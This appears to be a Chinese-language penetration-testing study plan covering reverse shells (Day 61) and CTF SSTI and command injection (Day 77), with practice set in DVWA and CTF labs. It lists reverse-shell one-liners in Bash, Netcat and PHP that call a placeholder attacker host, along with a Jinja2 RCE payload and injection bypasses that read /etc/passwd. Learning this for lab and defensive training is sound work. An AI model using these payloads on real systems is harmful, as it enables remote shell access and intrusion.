# 第九周：提权与后渗透基础

## Day 61 — 反弹 Shell 技术

### 今日任务
- [ ] 理解反弹 Shell 的原理：目标主机主动连接攻击者，绕过防火墙入站限制
- [ ] 掌握常见反弹 Shell 命令：
  - Bash：`bash -i >& /dev/tcp/attacker_ip/port 0>&1`
  - Python：`python -c 'import socket,subprocess,os;...'`
  - Netcat：`nc -e /bin/bash attacker_ip port`
  - PHP：`php -r '$sock=fsockopen("attacker_ip",port);exec("/bin/sh -i <&3 >&3 2>&3");'`
- [ ] 学会在攻击机上用 `nc -lvnp port` 接收反弹 Shell
- [ ] 学会升级为完全交互式 Shell：`python -c 'import pty;pty.spawn("/bin/bash")'`

### 今日积累
- ⭐ 反弹 Shell 是漏洞利用后获取控制的标准方式，必须背下来
- 反弹 Shell 速查站：https://www.revshells.com/
- 升级 Shell 的完整步骤：`python pty.spawn` → `Ctrl+Z` → `stty raw -echo; fg` → `export TERM=xterm`

### 今日练习
在 DVWA 的命令注入模块中，尝试通过反弹 Shell 获取服务器权限。

### 今日积累

## Day 77 — CTF Web：SSTI + 命令注入

### 今日任务

- [ ] CTF 中的 SSTI 检测：`{{7*7}}` → 页面显示 49 则存在注入
- [ ] 练习命令注入的各种绕过：空格绕过（`$IFS`、`{cat,/etc/passwd}`）、管道符、反引号
- [ ] 刷 3-5 道 SSTI/命令注入题目

### 今日积累
- Jinja2 RCE payload：`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- 命令注入绕过空格：`cat${IFS}/etc/passwd`、`cat<>/etc/passwd`
- 命令注入分隔符：`;`、`|`、`||`、`&&`、`\n`（URL编码 `%0a`）
